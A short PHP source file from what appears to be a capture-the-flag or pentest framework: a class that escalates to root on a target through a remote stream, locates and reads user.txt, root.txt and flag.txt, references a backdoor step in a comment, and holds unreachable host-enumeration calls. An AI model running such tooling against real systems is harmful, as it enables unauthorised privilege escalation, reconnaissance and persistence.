<?php

class root4linux extends tunnel4linux{
    
    var $etc_shadow_str ;
    
    
    
    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64,$uid_pass) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64,$uid_pass);        
    }
    
    
    
    public function lan4pentest(){
        $result = "";
        $this->titre(__FUNCTION__);
        
        $this->port2root($this->templateB64_cmd);
        
        $tab_flag_name = array("user.txt","root.txt","flag.txt");
        foreach ($tab_flag_name as $flag_name){
            //if (!$this->lan2file4exist($flag_name)){
            $flag_path = $this->lan2file4locate($flag_name);
            $data = "cat $flag_path";
            $this->lan2stream4result($data, $this->stream_timeout*3);
            //}
        }
        
        
        //$this->root2backdoor();
        
        
        return $result;
        
        $shell = $this->lan2shell();$this->article("SHELL",$shell);$result .= $shell ; $this->pause();
        $os = $this->lan2os();$this->article("OS",$os); $result .= $os ; $this->pause();
        $info = $this->lan2infos(); $this->article("INFOS",$info);$result .= $info ; $this->pause();
        $users = $this->lan2users();$this->article("USERS",$users); $result .= $users ; $this->pause();
        $lhost = $this->lan2lhost();$this->article("LHOST",$lhost);$result .= $lhost; $this->pause();
        $network = $this->lan2network();$this->article("NETWORK",$network);$result .= $network;      $this->pause();
        $bins = $this->lan2bins();$this->article("BINS",$bins);$result .= $bins ;  $this->pause();
        $hw = $this->lan2hw();$this->article("HW",$hw);$result .= $hw ; $this->pause();
        $ps = $this->lan2ps();$this->article("PS",$ps);$result .= $ps ; $this->pause();
        $tools = $this->lan2tools();$this->article("TOOLS",$tools);$result .= $tools; $this->pause();
        $pids = $this->lan2pid();$this->article("PIDs",$pids);$result .= $pids ; $this->pause();
        
        
        
        return $result;
    }
    
    
    
 
    
}
?>
